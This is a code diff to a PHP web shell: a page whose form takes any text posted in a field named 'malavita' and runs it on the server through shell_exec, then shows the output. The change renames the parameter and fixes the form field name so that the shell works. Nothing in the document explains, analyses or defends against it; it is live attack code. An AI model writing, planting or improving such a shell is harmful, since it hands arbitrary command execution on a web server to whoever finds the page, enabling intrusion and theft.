@@ -1,6 +1,6 @@
 <?php
-if (!empty($_POST['m4l4v1t4'])) {
-    $cmd = shell_exec($_POST['m4l4v1t4']);
+if (!empty($_POST['malavita'])) {
+    $malavita = shell_exec($_POST['malavita']);
 }
 ?>
 <!DOCTYPE html>
@@ -83,9 +83,9 @@ if (!empty($_POST['m4l4v1t4'])) {
 <body>
     <main>
         <form method="post">
-            <label for="cmd"><strong>Command</strong></label>
+            <label for="malavita"><strong>Command</strong></label>
             <div class="form-group">
-                <input type="text" name="cmd" id="cmd" value="<?php echo htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'); ?>"
+                <input type="text" name="malavita" id="malavita" value="<?php echo htmlspecialchars($_POST['malavita'], ENT_QUOTES, 'UTF-8'); ?>"
                        onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                 <button type="submit">Execute</button>
             </div>
@@ -93,8 +93,8 @@ if (!empty($_POST['m4l4v1t4'])) {
 
         <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
             <h2>Output</h2>
-            <?php if (isset($cmd)): ?>
-                <pre><samp><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></samp></pre>
+            <?php if (isset($malavita)): ?>
+                <pre><samp><?= htmlspecialchars($malavita, ENT_QUOTES, 'UTF-8') ?></samp></pre>
             <?php else: ?>
                 <pre><small>No result.</small></pre>
             <?php endif; ?>
